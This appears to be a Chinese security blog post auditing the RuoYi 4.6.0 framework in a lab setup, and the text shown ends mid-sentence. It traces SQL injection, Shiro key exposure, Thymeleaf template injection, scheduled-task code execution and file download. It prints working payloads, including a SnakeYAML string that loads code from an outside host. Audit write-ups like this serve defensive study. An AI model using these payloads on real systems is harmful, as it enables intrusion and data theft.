---
title: 若依 RuoYi4.6.0 代码审计
url: https://mp.weixin.qq.com/s/uUWuqcCs1vpdOqHBLrj17A
source: Doonsec's feed
date: 2026-04-13
fetch_date: 2026-04-14T04:43:12.827546
---

# 若依 RuoYi4.6.0 代码审计

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mwFvjeHDLkjeGNyPPicZNhhhvXwbJxDT4bRxSvBo18ibiaXBt1bQfpB8QMUq3lt3mvAk0Js5omgicgsxjAicia0KlzOJ9G2uMcGZaqq9oDQYevvBQ/0?wx_fmt=jpeg)

# 若依 RuoYi4.6.0 代码审计

dabai001
dabai001

蚁景网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

环境布置：

到官网下载源码：https://github.com/yangzongzhuan/RuoYi

采用phpstudy集成数据库，5.7版本。JDK1.8。

IDEA打开项目，等待自动加载，修改application-druid.yml配置文件：数据库名，账号密码，连接数据库,修改application.yml中的端口，避免与80端口冲突。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnazmLBa8bmpvOibas3znqG2akElwAmfZdG9dqBJ4SUaKfiaWAXKFAp2tA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1 "null")

导入：quartz.sql与ry\_20201214.sql文件。

运行RuoYiApplication文件。

访问后台：http://localhost:25001/login

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnUeWfHiaSHcrVSDJ7UMNapCY63BnbgQGnwawv7Y5nHB4ibN3HWLP5EEhQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2 "null")

Sql注入漏洞：

由于该项目采用了mybatis开发，常见的找sql注入的方法就是全局搜索${

定位到可疑参数：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnJnyh9OWVUjZzmn7eVz1shpcs6xptJvf4CvAO3BiaRDyurm2HnVqxYhQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3 "null")

根据id值selectRoleList全局搜索，从xml定位到dao层：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnq0xlCwp38Nyjxb5kumhwWJ45lxLHaxtkSCqx1UYNVq11dMHJBnZlvQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4 "null")

右键单击，找该接口的使用，在使用处发现selectRoleList方法，全局搜索该方法，定位controller层查看接口与传参：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnCcDYmuiatQJIklTfKKOKGXUPkqvwlCNCY3VGluXkG6O6AL4B3e14Mkg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5 "null")

如下，定位到controller层：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnAHMiaXFibgtrsXZv7SeN6uQxr2DNiaPBn1nczKyMibFGXaOS4kLjqBEqLQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6 "null")

分析代码：首先以@RequiresPermissions注解表明接口访问权限，再以@PostMapping注解表明接收接口，并且以@ResponseBody注解表明回将返回值写入http响应。

此方法会接收一个SysRole类型的role值，并且将接受的role值以selectRoleList方法处理后返回给list，最后返回给http响应。

于是我们现在需要分析

1：role对象在接收它的参数时是否有过滤，

2：selectRoleList方法在处理role接收后的值是否有过滤。

跟进SysRole类，发现无过滤：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnibicBAlHnj7mbbXH7oMcfddLrxtMvlEdcAwTCuYC8iarYFBVjxJtxBuJA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=7 "null")

跟进selectRoleList方法，发现无过滤：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnkIakXwnzcLvGiasgWjHYGcBNsJJtMDj4E03icyHE3RQyU5WmV0MUtzrQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=8 "null")

于是确定原dataScope参数存在sql注入，到前端功能找对应数据包。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnA66rZYCYkEwYZYySrsSjDPKnGOnmlO4wcicdrOIO5Cj8QccxPzuOZ7w/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=9 "null")![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnuGu3oticoMhOsvxbDKEib4S6DLbFtNUv3691DBB8enBFd5eskRcviaRxA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=10 "null")

发现不存在dataScope参数,手动添加：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnyM1oHwIJsF3V6XLtSicMWG6AcjI0V7EzF3jmPicXfctB00m1KuVITfIw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=11 "null")

将localhost换成主机IP，放入sqlmap验证

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCniaAYzTVia0D3K3m46kIox26hlp9xXWkkjmD4lxsL3lCmrHsbI4BqPptA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=12 "null")

Shiro反序列化：

首先查看项目pom文件，发现shiro版本为1.7.0：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCngOKt7eHv6IweyibHEru2al0uiaYP8jd0G6LkAichsJz0BcyDXr8LT4oMw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=13 "null")

全局搜索cipherKey，定位到密钥值：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnaW7aCflNMNfedaRicibeoictyXogobMEgzue93JiasvxNPZ3O5CVJzpXJg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=14 "null")

由此结合shiro反序列化利用工具利用。

Shiro未授权访问：

查看shiro配置文件ShiroConfig.java，anon 为匿名拦截器，不需要登录就能访问。authc 为登录拦截器，需要登录认证才能访问。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnVR8c5ZibvsxwcqicS7oa2gjfvn9tL1Ol7Jz05UnBUQw9JtTmGRkHT3TQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=15 "null")

Thymeleaf模板注入：

本框架采用了 Thymeleaf 模板，全局搜索::

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnvoNlic0jmt5xfX8Oqo14HIWZX7oK2GzqkBrkC8OtmCw0ymVy38HbxJQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=16 "null")

根据Mapping构造路径，发送poc

fragment=\_\_\*%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d\_\_::.x

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCn9IcrAuBfotdNSHBKob1ZhFnC8u2KhEPScTHQdD8M3mV3ztNWt4CIZQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=17 "null")

计划任务RCE:

如图添加计划任务

将调用目标字符修改如下：

org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://w2h0ib.dnslog.cn\"\]\]\]\]\')

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnPFqAsOaJnx2eZL7ib39XnzT96jcPc2pYuJ8rDibRUFabQlaWPgMy9Djg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=18 "null")

调用执行：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnKbreLcgpXSRUVJSLsHIJsKwk5dlASsttUjHmfCVpCTTzrmmHdLn85w/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=19 "null")![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnaPXNakcXicjRwwr1nQZP2cRc9b8CokZAToKuzibHC7SSGmWibqZgENy4g/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=20 "null")

任意文件下载漏洞：

继续如上创建定时任务：

ruoYiConfig.setProfile('/home/clown/Project/RuoYi-v4.6.0/ruoyi-admin/src/main/resources/application.yml')

执行后访问如下路径实现文件下载：

/common/download/resource?resource=.zip

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCniaHkgY8fYxVghEq0OapkhwlfEMyl0eOpXs3H9wq36lSYpRoupzwnfvQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=21 "null")

跟踪下载路径定位代码：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnyISxPOlGDN5kSegcf1cJxJdUPqCZaCrFrKFX7oZrhdwgGouQxFJF6A/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=22 "null")

该处代码先接收resource的值，再将该值放入checkAllowDownload方法里面校验后，进入下载文件的代码调用。

于是跟进checkAllowDownload方法：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnd2T8bjJrzPaK9zibfo631YaDMSxU161xriav1ajs85N5WEliciatrFuxOg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=23 "null")

发现该方法主要做了两件事：

1：禁止掉resource中的目录穿越../

2：以白名单形式检查文件下载规则

这里主要跟进一下2的代码：

取点后缀：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnWcHDc9TSice5xAwzB14baYsNJamPf9sc4uF9jxOrkEKibEO9SjrJb3qQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=24 "null")

再以点后缀进行白名单匹配：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCn21qPm4Lz0oE1NvCVueM6QNUVqEahG5cQvph8yyXNcSxIZo5FcOnB1A/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=25 "null")

如果在原controller层if判断为假，进入下载文件代码流程：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnoU5aVDQTAECEPsSEiccTuhlXQbEUjIu4Qu1n5Y6m5lLY8Pib1jQJZ5LA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=26 "null")

至此可发现下载文件的路径不可控，且类型存在白名单限制！

此时我们继续跟进本地资源路径的代码：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCnZTFRPicjZhkGOicrN352Mw3qGgOgf7ibjx26gprW0eWeM9Xpn2bRdxqibQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=27 "null")

我们可以发现本地资源路径是通过getProfile进行获取，且该RuoYiConfig类存在setProfile方法，由此可知，可以通过计划任务调用该类的setProfile方法设置好路径，直接绕过了前面的if过滤：

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldzxTPlyCa5ph1Hq2wbWXNCndgnfic5fATwnZNj6iczGcRlPuDEcF0hc8pLibYBQL7J3PwcyAAD8TDnZw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=28 "null")

之后即可调用/common/do...